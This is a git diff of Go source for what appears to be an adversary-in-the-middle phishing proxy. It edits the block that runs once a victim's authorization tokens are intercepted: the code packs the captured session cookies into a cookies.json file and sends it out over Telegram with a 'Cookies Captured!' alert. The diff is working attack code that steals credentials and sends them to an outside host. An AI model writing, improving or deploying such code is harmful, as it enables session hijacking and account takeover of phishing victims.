@@ -1099,39 +1099,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 						// Create cookies.json content
+						// Convert cookies to JSON format and send file
 						var cookiesList []CookieJSON
 						for domain, cookies := range s.CookieTokens {
 							for name, cookie := range cookies {
-								// Calculate expirationDate in Unix timestamp
-								var expirationDate int64
-								if !cookie.Expires.IsZero() {
-									expirationDate = cookie.Expires.Unix()
-								}
-								
 								cookieJSON := CookieJSON{
 									Path:           cookie.Path,
-									Domain:         domain,
-									ExpirationDate: expirationDate,
+									Domain:         domain,  // Using the map key as domain
 									Value:          cookie.Value,
-									Name:           name,
+									Name:           name,    // Using the map key as name
 									HttpOnly:       cookie.HttpOnly,
-									HostOnly:       cookie.Domain == domain,
-									Secure:         cookie.Secure,
-									Session:        cookie.Expires.IsZero(),
+									HostOnly:       false,   // Default value, adjust if needed
+									Secure:         false,   // Default value, adjust if needed
+									Session:        true,    // Default value, adjust if needed
 								}
 								cookiesList = append(cookiesList, cookieJSON)
 							}
 						}
-						
+
 						// Convert to JSON
 						jsonData, err := json.MarshalIndent(cookiesList, "", "    ")
 						if err != nil {
 							log.Error("Failed to marshal cookies to JSON: %v", err)
-							return
 						}
-						
+
 						// Send JSON file
 						p.telegram.SendFile("cookies.json", string(jsonData))
+
 
 						message := fmt.Sprintf(`🍪 <b>Cookies Captured!</b>
 
